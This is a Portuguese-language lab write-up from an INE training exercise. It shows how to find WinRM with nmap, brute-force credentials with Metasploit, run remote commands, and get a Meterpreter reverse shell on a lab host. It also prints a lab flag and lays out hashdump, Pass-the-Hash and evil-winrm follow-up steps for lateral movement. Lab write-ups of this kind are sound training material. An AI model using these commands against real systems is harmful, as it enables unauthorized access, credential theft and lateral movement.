# 🧪 Lab Report — WinRM: Brute Force, Auth Methods e Meterpreter

> **Plataforma:** INE
> **Tema central:** Descoberta do WinRM → Brute force de credenciais → Verificação de métodos de autenticação → Execução remota de comandos → Shell Meterpreter
> **Alvo:** `demo.ine.local`

---

## 🎯 Objetivo

Identificar o serviço WinRM rodando no alvo, obter credenciais via brute force, verificar métodos de autenticação suportados, executar comandos remotamente e obter sessão Meterpreter.

---

## 🧠 O Que é WinRM

**WinRM (Windows Remote Management)** é a implementação Microsoft do protocolo **WS-Management** — um padrão baseado em SOAP/HTTP para gerenciamento remoto de sistemas Windows.

É o equivalente Windows do SSH em Linux — permite execução remota de comandos, scripts e gerenciamento do sistema sem interface gráfica.

| Característica | Valor |
|---------------|-------|
| Protocolo base | HTTP/HTTPS |
| Porta padrão HTTP | **5985** |
| Porta padrão HTTPS | **5986** |
| Autenticação | Basic, NTLM, Kerberos, Certificate |
| Shell remoto | `evil-winrm`, `winrs`, PowerShell Remoting |

**Relação com PowerShell Remoting:**
`Enter-PSSession` e `Invoke-Command` do PowerShell usam WinRM como transporte — habilitar PS Remoting habilita WinRM.

---

## 📋 Sumário de Etapas

| # | Ação | Módulo | Resultado |
|---|------|--------|-----------|
| 1 | Descobrir porta WinRM | `nmap --top-ports 7000` | Porta 5985 aberta |
| 2 | Brute force de credenciais | `winrm_login` | `administrator:tinkerbell` |
| 3 | Verificar métodos de auth | `winrm_auth_methods` | Basic e Negotiate |
| 4 | Executar comando remoto | `winrm_cmd` | `whoami` executado |
| 5 | Obter Meterpreter | `winrm_script_exec` | Sessão ativa |
| 6 | Ler flag | `cat flag.txt` | `3c716f95616eec677a7078f92657a230` |

---

## 🔬 Execução Passo a Passo

### Step 1 — Descobrir Porta WinRM

```bash
nmap --top-ports 7000 demo.ine.local
```

**Por que `--top-ports 7000`:**
A porta padrão do WinRM (5985) está fora das top 1000 portas do Nmap. Com `--top-ports 1000` (padrão), ela não apareceria. Expandir para 7000 cobre portas menos comuns sem precisar do scan completo `-p-` (mais lento).

| Scan | Portas cobertas | Velocidade | Cobre 5985? |
|------|----------------|-----------|------------|
| `nmap IP` | Top 1000 | Rápido | ❌ |
| `--top-ports 7000` | Top 7000 | Médio | ✅ |
| `-p-` | 65535 | Lento | ✅ |

**Resultado:**
```
5985/tcp  open  wsman
```

`wsman` = WS-Management = WinRM confirmado.

---

### Step 2 — Brute Force com winrm_login

```bash
msfconsole -q

use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
exploit
```

**Por que `set PASSWORD anything`:**
Versões recentes do módulo `winrm_login` exigem que a opção `PASSWORD` tenha algum valor definido, mesmo quando `PASS_FILE` está configurado. O valor `anything` é um placeholder — o módulo ainda usa a wordlist do `PASS_FILE`. Sem isso, o módulo pode se recusar a executar com erro de validação.

**Resultado:**
```
[+] demo.ine.local:5985 - Login Successful: administrator:tinkerbell
[*] Command shell session 1 opened
```

Além de reportar a credencial, o módulo automaticamente abre uma **command shell session** em background quando encontra sucesso.

---

### Step 3 — Verificar Métodos de Autenticação

```bash
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS demo.ine.local
exploit
```

**Por que verificar os métodos de auth antes de conectar:**

O WinRM suporta múltiplos métodos de autenticação, e nem todos estão habilitados por padrão em todos os ambientes:

| Método | Como Funciona | Segurança |
|--------|--------------|-----------|
| **Basic** | Usuário:senha em Base64 — texto claro sobre HTTP | ⚠️ Baixa |
| **Negotiate** | Kerberos com fallback para NTLM | ✅ Média-Alta |
| **Kerberos** | Ticket Kerberos — padrão em AD | ✅ Alta |
| **Digest** | Hash MD5 — legado | ⚠️ Baixa |
| **Certificate** | Certificado cliente TLS | ✅ Alta |

**Resultado:**
```
[+] demo.ine.local:5985 - Negotiate protocol supported
[+] demo.ine.local:5985 - Basic protocol supported
```

Saber que **Basic** está habilitado é importante — significa que ferramentas como `evil-winrm` e o módulo `winrm_cmd` conseguem autenticar sem precisar de Kerberos ou NTLM relay.

---

### Step 4 — Executar Comando Remoto via winrm_cmd

```bash
use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
exploit
```

**O que é o `winrm_cmd`:** Módulo auxiliar que executa um único comando no sistema remoto via WinRM e retorna o output. Útil para reconhecimento rápido sem abrir sessão interativa.

**Outros comandos úteis:**
```bash
# Informações do sistema
set CMD systeminfo
run

# Usuários locais
set CMD "net user"
run

# Verificar privilégios
set CMD "whoami /priv"
run

# Listar arquivos
set CMD "dir C:\\"
run

# Ver processos
set CMD "tasklist"
run
```

**Resultado do `whoami`:**
```
[+] demo.ine.local:5985 - winrm_cmd returned:
nt authority\system
```

---

### Step 5 — Obter Meterpreter via winrm_script_exec

```bash
use exploit/windows/winrm/winrm_script_exec
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set FORCE_VBS true
exploit
```

**O que é o `winrm_script_exec`:** Exploit que usa WinRM para executar um script VBScript no sistema remoto, que por sua vez baixa e executa o payload Meterpreter.

**Por que `FORCE_VBS true`:**
O módulo por padrão tenta usar PowerShell para executar o payload. Em alguns ambientes, o PowerShell está restrito por política (`ExecutionPolicy`). Com `FORCE_VBS true`, o módulo usa VBScript como alternativa — que geralmente não tem as mesmas restrições.

| Opção | Método | Quando Usar |
|-------|--------|-------------|
| `FORCE_VBS false` | PowerShell | Ambiente sem restrições de PS |
| `FORCE_VBS true` | VBScript | ExecutionPolicy bloqueando PS |

**Output:**
```
[*] Started reverse TCP handler on IP_KALI:4444
[*] Connecting to WinRM...
[*] Executing VBScript...
[*] Sending stage to IP_ALVO
[*] Meterpreter session 1 opened

meterpreter >
```

---

### Step 6 — Localizar e Ler a Flag

```bash
meterpreter > cd /
meterpreter > dir
meterpreter > cat flag.txt
```

**Flag:**
```
3c716f95616eec677a7078f92657a230
```

> 💡 `cd /` dentro do Meterpreter no Windows vai para `C:\`. `cat` funciona como alias para `type` no contexto do Meterpreter.

---

## 📊 Resultado Final

| Informação | Valor |
|-----------|-------|
| Serviço | WinRM |
| Porta | 5985 (HTTP) |
| Auth suportada | Basic, Negotiate |
| Credencial | `administrator:tinkerbell` |
| Contexto de execução | `NT AUTHORITY\SYSTEM` |
| Flag | `3c716f95616eec677a7078f92657a230` |

---

## 🧠 Conceitos Consolidados

### WinRM na Cadeia de Ataque

```
WinRM habilitado + credencial válida
        ↓
winrm_cmd   → execução de comandos individuais (recon)
        ↓
winrm_script_exec → Meterpreter (controle total)
        ↓
hashdump → Pass-the-Hash em outros sistemas
```

### Comparativo de Ferramentas WinRM

| Ferramenta | Tipo | Uso |
|-----------|------|-----|
| `winrm_login` | MSF Auxiliary | Brute force de credenciais |
| `winrm_auth_methods` | MSF Auxiliary | Verificar autenticação suportada |
| `winrm_cmd` | MSF Auxiliary | Executar comando único |
| `winrm_script_exec` | MSF Exploit | Obter Meterpreter |
| `evil-winrm` | External tool | Shell interativa (muito usada em CTF) |
| `winrs.exe` | Windows nativo | Shell remota nativa |

### evil-winrm — Alternativa Popular (OSCP/CTF)

```bash
# Instalar
gem install evil-winrm

# Conectar com credencial
evil-winrm -i demo.ine.local -u administrator -p tinkerbell

# Conectar com hash NTLM (Pass-the-Hash)
evil-winrm -i IP -u administrator -H HASH_NTLM

# Upload de arquivo
evil-winrm> upload /caminho/local arquivo_remoto

# Download de arquivo
evil-winrm> download arquivo_remoto /caminho/local

# Executar script PowerShell local no contexto remoto
evil-winrm> Invoke-Binary /caminho/local/script.ps1
```

### Por Que `--top-ports 7000` Importa

```
Portas de serviços corporativos fora do top 1000:
5985  WinRM HTTP
5986  WinRM HTTPS
8080  HTTP alternativo
8443  HTTPS alternativo
8888  Jupyter Notebook
9090  Prometheus
9200  Elasticsearch
27017 MongoDB

Lição: scan padrão do Nmap perde serviços corporativos importantes.
Usar -p- quando possível, ou --top-ports 5000/7000 como compromisso.
```

---

## 🔁 Próximos Passos Lógicos

```
Meterpreter SYSTEM obtido
        ↓
hashdump → hashes NTLM de todos os usuários
        ↓
Pass-the-Hash via crackmapexec em outros IPs
crackmapexec smb SUBNET -u administrator -H HASH
        ↓
evil-winrm -H HASH → acesso direto sem senha
        ↓
Checar configurações de PS Remoting
Get-WSManCredSSP
```

---

## 📌 Relacionados

- [[BlueKeep — CVE-2019-0708 RDP]]
- [[SMB Brute Force e PsExec Meterpreter]]
- [[Pass-the-Hash — Ataque PtH]]
- [[Metasploit — Fundamentos e Arquitetura]]
- [[Hydra]]
- [[Cheatsheet — Portas Importantes]]

#lab #exploração #winrm #ferramenta/metasploit #windows #lateral-movement
